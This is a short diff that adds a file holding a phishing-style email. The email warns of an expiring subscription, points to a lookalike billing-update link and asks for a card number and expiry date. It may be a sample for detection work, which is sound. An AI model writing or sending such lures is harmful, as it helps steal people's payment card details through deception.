@@ -1,0 +1,7 @@
+Hello,
+
+Your subscription is expiring soon. To avoid any interruption, 
+please update your billing information at your earliest convenience:
+http://account-billing-update.net/renew
+
+Enter your card number and expiry date to continue.
